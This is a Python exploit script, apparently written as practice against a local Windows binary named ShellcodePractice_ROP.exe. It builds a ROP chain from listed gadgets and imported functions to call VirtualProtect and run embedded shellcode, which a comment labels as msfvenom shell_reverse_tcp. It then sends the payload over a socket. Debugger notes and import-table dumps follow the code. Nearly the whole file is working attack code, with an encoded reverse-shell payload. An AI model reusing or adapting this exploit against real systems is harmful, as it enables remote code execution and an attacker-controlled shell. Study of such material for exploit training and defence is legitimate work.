import socket
import struct


def do_shellcode(img_base, buff_addr):
    shellcode = b""

    # int WSAStartup(
    #         WORD      wVersionRequired,   rcx
    #   [out] LPWSADATA lpWSAData           rdx
    # );

    # call WSASartup
    shellcode += b"\x48\xBA"
    shellcode += struct.pack('<Q', buff_addr)       # mov rdx, 0x7ff61bdd5000
    shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"    # mov rcx, 0x202
    shellcode += b"\x48\xBF"    # mov rax, WS2_32!WSAStartup
    shellcode += struct.pack('<Q', img_base + 0x30f8)
    shellcode += b"\x48\x8B\x07"
    shellcode += b"\x48\x81\xEC\x08\x10\x00\x00"
    shellcode += b"\xFF\xd0"                                    # call rax

    # add rsp, b8
    # shellcode += b"\x48\x81\xC4\xE8\x09\x00\x00"

    # msfvenom shell_reverse_tcp
    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
    shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe8\x87\x06\x21\x93"
    shellcode += b"\x6a\xb6\xd9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    shellcode += b"\xff\xe2\xf4\x14\xcf\x85\xc5\x63\x82\x76\xd9\xe8"
    shellcode += b"\x87\x47\x70\xd2\x3a\xe4\x88\xbe\xcf\x37\xf3\xf6"
    shellcode += b"\x22\x3d\x8b\x88\xcf\x8d\x73\x8b\x22\x3d\x8b\xc8"
    shellcode += b"\xcf\x8d\x53\xc3\x22\xb9\x6e\xa2\xcd\x4b\x10\x5a"
    shellcode += b"\x22\x87\x19\x44\xbb\x67\x5d\x91\x46\x96\x98\x29"
    shellcode += b"\x4e\x0b\x60\x92\xab\x54\x34\xba\xc6\x57\x69\x18"
    shellcode += b"\x38\x96\x52\xaa\xbb\x4e\x20\x43\xe1\x36\x51\xe8"
    shellcode += b"\x87\x06\x69\x16\xaa\xc2\xbe\xa0\x86\xd6\x71\x18"
    shellcode += b"\x22\xae\x9d\x63\xc7\x26\x68\x92\xba\x55\x8f\xa0"
    shellcode += b"\x78\xcf\x60\x18\x5e\x3e\x91\xe9\x51\x4b\x10\x5a"
    shellcode += b"\x22\x87\x19\x44\xc6\xc7\xe8\x9e\x2b\xb7\x18\xd0"
    shellcode += b"\x67\x73\xd0\xdf\x69\xfa\xfd\xe0\xc2\x3f\xf0\xe6"
    shellcode += b"\xb2\xee\x9d\x63\xc7\x22\x68\x92\xba\xd0\x98\x63"
    shellcode += b"\x8b\x4e\x65\x18\x2a\xaa\x90\xe9\x57\x47\xaa\x97"
    shellcode += b"\xe2\xfe\xd8\x38\xc6\x5e\x60\xcb\x34\xef\x83\xa9"
    shellcode += b"\xdf\x47\x78\xd2\x30\xfe\x5a\x04\xa7\x47\x73\x6c"
    shellcode += b"\x8a\xee\x98\xb1\xdd\x4e\xaa\x81\x83\xe1\x26\x17"
    shellcode += b"\x78\x5b\x68\x2d\x1d\xc5\xeb\xb7\xb4\x34\x21\x93"
    shellcode += b"\x2b\xe0\x90\x61\x61\x4e\xa0\x7f\xca\xb7\xd9\xe8"
    shellcode += b"\xce\x8f\xc4\xda\xd6\xb4\xd9\xf3\xbe\xc6\x89\x92"
    shellcode += b"\xc5\xf7\x8d\xa1\x0e\xe2\x6d\x1a\x9b\xf7\x63\xa4"
    shellcode += b"\xf0\x20\x26\x6c\xbf\xfa\x50\x02\xef\x07\x20\x93"
    shellcode += b"\x6a\xef\x98\x52\xae\x86\x4a\x93\x95\x63\x89\xb8"
    shellcode += b"\xca\x37\xe8\xde\x5b\x76\x91\x17\x47\x4e\xa8\x51"
    shellcode += b"\x22\x49\x19\xa0\x0e\xc7\x60\x29\x80\xb9\x06\x08"
    shellcode += b"\x78\xd3\x69\x1a\xad\xdc\xc9\xa9\xdf\x4a\xa8\x71"
    shellcode += b"\x22\x3f\x20\xa9\x3d\x9f\x84\xe7\x0b\x49\x0c\xa0"
    shellcode += b"\x06\xc2\x61\x91\x6a\xb6\x90\x50\xe4\x6b\x45\x93"
    shellcode += b"\x6a\xb6\xd9\xe8\xc6\x56\x60\xc3\x22\x3f\x3b\xbf"
    shellcode += b"\xd0\x51\x6c\xa2\xaa\xdc\xd4\xb1\xc6\x56\xc3\x6f"
    shellcode += b"\x0c\x71\x9d\xcc\xd3\x07\x20\xdb\xe7\xf2\xfd\xf0"
    shellcode += b"\x41\x06\x49\xdb\xe3\x50\x8f\xb8\xc6\x56\x60\xc3"
    shellcode += b"\x2b\xe6\x90\x17\x47\x47\x71\xda\x95\x7e\x94\x61"
    shellcode += b"\x46\x4a\xa8\x52\x2b\x0c\xa0\x24\xb8\x80\xde\x46"
    shellcode += b"\x22\x87\x0b\xa0\x78\xcc\xaa\x9d\x2b\x0c\xd1\x6f"
    shellcode += b"\x9a\x66\xde\x46\xd1\x46\x6c\x4a\xd1\x47\x9b\x35"
    shellcode += b"\xff\x0b\x44\x17\x52\x4e\xa2\x57\x42\x8a\xdf\x94"
    shellcode += b"\x8d\x86\xda\x73\x1f\xb3\x62\xaf\x94\x74\x4e\xf9"
    shellcode += b"\x6a\xef\x98\x61\x5d\xf9\xf4\x93\x6a\xb6\xd9"

    return shellcode

'''
0x0000000140001018 : mov qword ptr [rsi], rax ; ret
0x000000014000101c : mov qword ptr [rsp + 8], rax ; ret
0x0000000140001010 : push rax ; ret
0x0000000140001009 : pop rax ; ret
0x0000000140001012 : jmp rax
0x0000000140001006 : pop rcx ; ret
0x0000000140001004 : pop rdx ; ret
0x0000000140001000 : pop rdi ; ret
0x0000000140001002 : pop rsi ; ret
0x0000000140001083 : pop rbx ; ret
0x0000000140001822 : pop rbp ; ret
0x0000000140001008 : pop r8 ; ret
0x000000014000100b : pop r9 ; ret
0x0000000140001f4a : add esp, 0x5c0 ; pop rbp ; ret
0x00000001400018e8 : add esp, 0x28 ; ret
0x0000000140001c3f : add rsp, 0x18 ; ret
0x0000000140001f17 : xchg esp, eax ; ret
0x0000000140001821 : pop rbx ; pop rbp ; ret
0x0000000140001001 : ret
'''

class AddrOf:
    # kernelbase offsets:
    virtualprotect = 0x6c470
    
    # Writable memory in ShellcodePractice_ROP.exe.data used for dummy out values.
    ImgDataSect = 0x5000

    # Imported Functions.
    GetModuleHandleW = 0x3030
    GetProcAddress = 0x3020
    GetProcessHeap = 0x3028
    RtlAllocHeap = 0x3018
    memcpy = 0x30c0

    # Gadgets in ShellcodePractice_ROP.exe.
    PopRbxRbpRet = 0x1821
    XchgEspEaxRet = 0x1f17
    MovQWordRsp8RaxRet = 0x101c
    JmpRax = 0x1012
    JmpQWordRax = 0x1016
    PushRaxRet = 0x1010
    PopRaxRet = 0x100e
    PopRcxRet = 0x1006
    PopRdxRet = 0x1004
    PopRbxRet = 0x1083
    PopRbpRet = 0x1822
    PopRdiRet = 0x1000
    PopRsiRet = 0x1002
    MovQWordRsiRax = 0x1018
    PopR8Ret = 0x1008
    PopR9Ret = 0x100b
    AddEsp5C0 = 0x1f4a
    AddEsp28 = 0x18e8
    AddRsp18Ret = 0x1c3f
    Ret = 0x1001

    def __init__(self, img_base):
        AddrOf.ImgDataSect += img_base

        AddrOf.GetModuleHandleW += img_base
        AddrOf.GetProcAddress += img_base
        AddrOf.GetProcessHeap += img_base
        AddrOf.RtlAllocHeap += img_base
        AddrOf.memcpy += img_base

        AddrOf.PopRbxRbpRet += img_base
        AddrOf.XchgEspEaxRet += img_base
        AddrOf.MovQWordRsp8RaxRet += img_base
        AddrOf.JmpRax += img_base
        AddrOf.JmpQWordRax += img_base
        AddrOf.PushRaxRet += img_base
        AddrOf.PopRaxRet += img_base
        AddrOf.PopRcxRet += img_base
        AddrOf.PopRdxRet += img_base
        AddrOf.PopRbxRet += img_base
        AddrOf.PopRdiRet += img_base
        AddrOf.PopRsiRet += img_base
        AddrOf.MovQWordRsiRax += img_base
        AddrOf.PopRbpRet += img_base
        AddrOf.PopR8Ret += img_base
        AddrOf.PopR9Ret += img_base
        AddrOf.AddEsp5C0 += img_base
        AddrOf.AddEsp28 += img_base
        AddrOf.AddRsp18Ret += img_base
        AddrOf.Ret += img_base

img_base = 0
buff_addr = 0
# b'K\x00E\x00R\x00N\x00E\x00L\x00B\x00A\x00S\x00E\x00.\x00d\x00l\x00l\x00'
# b'K\x00E\x00R\x00N\x00E\x00L\x00B\x00A\x00S\x00E\x00.\x00D\x00L\x00L\x00\x00\x00'

# GetModuleHandleWStub - 14c0 = VirtualProtectStub
# 0x000002936c3b0000
def fmt(val):
    return struct.pack('<Q', val)

def gimme_buf(buff_addr, img_base):
    gadgets = AddrOf(img_base)
    shellcode = do_shellcode(img_base, buff_addr)
    # kernelbase = "KERNELBASE.dll".encode("utf-16-le")
    kernelbase = b'K\x00E\x00R\x00N\x00E\x00L\x00B\x00A\x00S\x00E\x00.\x00D\x00L\x00L\x00\x00\x00'
    virtualprotect = b'VirtualProtect\x00\x00'
    data_section = img_base + 0x5000
    payload = (
        b'q' +
        kernelbase +
        virtualprotect +
        shellcode + 
        b'\x90' * (1591 - len(kernelbase) - len(virtualprotect) - len(shellcode)) +

        fmt(gadgets.PopRcxRet)+
        fmt(data_section) + 
        fmt(gadgets.PopRdxRet)+
        fmt(buff_addr + 1)+
        fmt(gadgets.PopR8Ret)+
        fmt(0x800)+
        fmt(gadgets.PopRaxRet) +
        fmt(gadgets.memcpy)+
        fmt(gadgets.JmpQWordRax)+
        
        fmt(gadgets.MovQWordRsp8RaxRet) +  # put value of rax ->
        fmt(gadgets.PopRcxRet) +
        fmt(0) +                             # here

        # rbx gets put on the stack in getmodulehandle
        fmt(gadgets.PopRbxRet) +
        fmt(gadgets.PopRaxRet)+

        # Call GetModuleHandleW
        fmt(gadgets.PopRaxRet) +
        fmt(buff_addr + 0x7d0) + 
        fmt(gadgets.PopRaxRet) +
        fmt(gadgets.GetModuleHandleW) +
        fmt(gadgets.JmpQWordRax) +
        
        # fmt(gadgets.MovQWordRsp8RaxRet) +  # put value of rax ->
        # fmt(gadgets.PopRcxRet) +
        # fmt(0) +                             # here

        fmt(gadgets.PopRcxRet) + 
        # Kernelbase
        fmt(gadgets.PopRaxRet) + # This gets overwritten with the address we wanted in getmodulehandlew
        fmt(gadgets.Ret)+
        fmt(gadgets.Ret)+
        fmt(gadgets.Ret)+
        # these get moved to the stack in get proc addr
        fmt(gadgets.PopRbxRbpRet)+
        fmt(gadgets.PopRaxRet)+
        fmt(gadgets.PopR9Ret)+
        fmt(gadgets.PopRsiRet)+
        fmt(data_section)+

        fmt(gadgets.PopRaxRet) +
        fmt(gadgets.GetProcAddress) + 
        fmt(gadgets.PopRdxRet)+
        fmt(data_section + len(kernelbase)) +
        fmt(gadgets.JmpQWordRax) +

        fmt(gadgets.Ret) +
        fmt(data_section) +         # overwritten with rbx -> PopRaxRet
        fmt(gadgets.PopR8Ret) +     # overwritten with addr -> VirtualProtect
        fmt(0x40)+                  # overwritten with rbp  -> PopR9Ret
        fmt(data_section) +         # overwritten with rsi -> data_section
        fmt(gadgets.PopR8Ret)+
        fmt(0x40) +
        fmt(gadgets.PopRdxRet) +
        fmt(0xa00) +
        fmt(gadgets.PopRcxRet) +
        fmt(data_section) +
        fmt(gadgets.Ret) + 
        fmt(gadgets.JmpRax) +
        fmt(data_section + len(kernelbase) + len(virtualprotect))
    )
    return payload

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect(("localhost", 51234))
        base_addr = sock.recv(8)
        base_addr = struct.unpack('<Q', base_addr)[0]
        print(hex(base_addr))
        
        buff_addr = sock.recv(8)
        buff_addr = struct.unpack('<Q', buff_addr)[0]
        print(hex(buff_addr))

        payload = gimme_buf(buff_addr, base_addr)
        print(f"Sending payload: {len(payload)}")

        x = sock.send(payload)

        print(f"Send: {x} of {len(payload)}")
    return


if __name__ == "__main__":
    main()

# buff[1536]
# copies 2048

# 00007ffe`b89dc470 - virtualprotect

# 0x0000000140001002 : pop rsi ; ret
# 0x00007ffeb89dc470 : kernelbase!virtualprotect
# 0x00007ffeb89c4220 KERNELBASE!VirtualAlloc (void)

'''
EAX = NOP sled  
ECX = Old protection (writable address)  
EDX = PAGE_EXECUTE_READWRITE  
EBX = Size  
EBP = VirtualProtect return address (JMP ESP)  
ESI = KERNEL32.DLL!VirtualProtect  
EDI = ROPNOP  
----
0x0000000140001009 : pop rax ; ret
0x0000000140001012 : jmp rax

0x0000000140001006 : pop rcx ; ret
0x0000000140001004 : pop rdx ; ret
0x0000000140001083 : pop rbx ; ret
0x0000000140001822 : pop rbp ; ret
0x0000000140001008 : pop r8 ; ret
0x000000014000100b : pop r9 ; ret
0x0000000140001001 : ret
----
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       RCX
  [in]  SIZE_T dwSize,          RDX
  [in]  DWORD  flNewProtect,    R8
  [out] PDWORD lpflOldProtect   R9
);

----

3000 [     218] address [size] of Import Address Table Directory

0:000> dps ShellcodePractice_ROP+3000 ShellcodePractice_ROP+3000+218
00007ff6`1bdd3000  00007ffe`b8face20 KERNEL32!CompareStringWStub
00007ff6`1bdd3008  00007ffe`b8fa5b50 KERNEL32!HeapFreeStub
00007ff6`1bdd3010  00007ffe`b8fa61d0 KERNEL32!GetLastErrorStub
00007ff6`1bdd3018  00007ffe`baf5a9a0 ntdll!RtlAllocateHeap
00007ff6`1bdd3020  00007ffe`b8fab650 KERNEL32!GetProcAddressStub
00007ff6`1bdd3028  00007ffe`b8fa6190 KERNEL32!GetProcessHeapStub
00007ff6`1bdd3030  00007ffe`b8fad8b0 KERNEL32!GetModuleHandleWStub
00007ff6`1bdd3038  00007ffe`b8fb5010 KERNEL32!GetCurrentProcessId
00007ff6`1bdd3040  00007ffe`b8fae2c0 KERNEL32!IsProcessorFeaturePresentStub
00007ff6`1bdd3048  00007ffe`b8fb0580 KERNEL32!SetUnhandledExceptionFilterStub
00007ff6`1bdd3050  00007ffe`b8fcd010 KERNEL32!UnhandledExceptionFilterStub
00007ff6`1bdd3058  00007ffe`b8fb0930 KERNEL32!IsDebuggerPresentStub
00007ff6`1bdd3060  00007ffe`b8f91010 KERNEL32!RtlVirtualUnwindStub
00007ff6`1bdd3068  00007ffe`b8fada70 KERNEL32!RtlLookupFunctionEntryStub
00007ff6`1bdd3070  00007ffe`b8fb4e40 KERNEL32!RtlCaptureContext
00007ff6`1bdd3078  00007ffe`baf9eba0 ntdll!RtlInitializeSListHead
00007ff6`1bdd3080  00007ffe`b8fa8310 KERNEL32!GetSystemTimeAsFileTimeStub
00007ff6`1bdd3088  00007ffe`b8fa5b30 KERNEL32!GetCurrentThreadId
00007ff6`1bdd3090  00007ffe`b8fa61f0 KERNEL32!QueryPerformanceCounterStub
00007ff6`1bdd3098  00000000`00000000
00007ff6`1bdd30a0  00007ffe`ad8a2720 VCRUNTIME140!__current_exception_context [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\eh\ehhelpers.cpp @ 119]
00007ff6`1bdd30a8  00007ffe`ad8a19c0 VCRUNTIME140!memset [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\string\amd64\memset.asm @ 59]
00007ff6`1bdd30b0  00007ffe`ad8a2700 VCRUNTIME140!__current_exception [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\eh\ehhelpers.cpp @ 114]
00007ff6`1bdd30b8  00007ffe`ad8af050 VCRUNTIME140!__C_specific_handler [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\eh\riscchandler.cpp @ 259]
00007ff6`1bdd30c0  00007ffe`ad8a1310 VCRUNTIME140!memcpy [D:\a\_work\1\s\src\vctools\crt\vcruntime\src\string\amd64\memcpy.asm @ 68]
00007ff6`1bdd30c8  00000000`00000000
00007ff6`1bdd30d0  00007ffe`b9f909c0 WS2_32!bind
00007ff6`1bdd30d8  00007ffe`b9f90410 WS2_32!WSACleanup
00007ff6`1bdd30e0  00007ffe`b9f85000 WS2_32!closesocket
00007ff6`1bdd30e8  00007ffe`b9f91380 WS2_32!WSAAccept
00007ff6`1bdd30f0  00007ffe`b9f856b0 WS2_32!WSASocketW
00007ff6`1bdd30f8  00007ffe`b9f8eb10 WS2_32!WSAStartup
00007ff6`1bdd3100  00007ffe`b9f85b20 WS2_32!GetAddrInfoW
00007ff6`1bdd3108  00007ffe`b9f81f60 WS2_32!WSASend
00007ff6`1bdd3110  00007ffe`b9f90500 WS2_32!WSARecv
00007ff6`1bdd3118  00007ffe`b9f92730 WS2_32!WSAGetLastError
00007ff6`1bdd3120  00000000`00000000
00007ff6`1bdd3128  00007ffe`b87b1d40 ucrtbase!_set_new_mode
00007ff6`1bdd3130  00000000`00000000
00007ff6`1bdd3138  00007ffe`b87b1b20 ucrtbase!_configthreadlocale
00007ff6`1bdd3140  00000000`00000000
00007ff6`1bdd3148  00007ffe`b8822690 ucrtbase!_setusermatherr
00007ff6`1bdd3150  00000000`00000000
00007ff6`1bdd3158  00007ffe`b8804630 ucrtbase!Exit
00007ff6`1bdd3160  00007ffe`b87b03e0 ucrtbase!exit
00007ff6`1bdd3168  00007ffe`b87ae400 ucrtbase!initialize_onexit_table
00007ff6`1bdd3170  00007ffe`b8804650 ucrtbase!c_exit
00007ff6`1bdd3178  00007ffe`b87b1940 ucrtbase!crt_atexit
00007ff6`1bdd3180  00007ffe`b8801f80 ucrtbase!terminate
00007ff6`1bdd3188  00007ffe`b87ae4a0 ucrtbase!initterm_e
00007ff6`1bdd3190  00007ffe`b87ae430 ucrtbase!initterm
00007ff6`1bdd3198  00007ffe`b8804690 ucrtbase!register_thread_local_exe_atexit_callback
00007ff6`1bdd31a0  00007ffe`b8804670 ucrtbase!cexit
00007ff6`1bdd31a8  00007ffe`b87b3230 ucrtbase!_p___wargv
00007ff6`1bdd31b0  00007ffe`b87b2780 ucrtbase!_get_initial_wide_environment
00007ff6`1bdd31b8  00007ffe`b87b09d0 ucrtbase!initialize_wide_environment
00007ff6`1bdd31c0  00007ffe`b87a25f0 ucrtbase!_register_onexit_function
00007ff6`1bdd31c8  00007ffe`b8794010 ucrtbase!configure_wide_argv
00007ff6`1bdd31d0  00007ffe`b87b3220 ucrtbase!_p___argc
00007ff6`1bdd31d8  00007ffe`b87b31f0 ucrtbase!set_app_type
00007ff6`1bdd31e0  00007ffe`b8800cc0 ucrtbase!seh_filter_exe
00007ff6`1bdd31e8  00000000`00000000
00007ff6`1bdd31f0  00007ffe`b87b1d70 ucrtbase!_set_fmode
00007ff6`1bdd31f8  00007ffe`b87b31e0 ucrtbase!_p__commode
00007ff6`1bdd3200  00007ffe`b87abb60 ucrtbase!__stdio_common_vfwprintf
00007ff6`1bdd3208  00007ffe`b87afcf0 ucrtbase!_acrt_iob_func
00007ff6`1bdd3210  00000000`00000000
00007ff6`1bdd3218  00007ff6`1bdd1dbc ShellcodePractice_ROP+0x1dbc
'''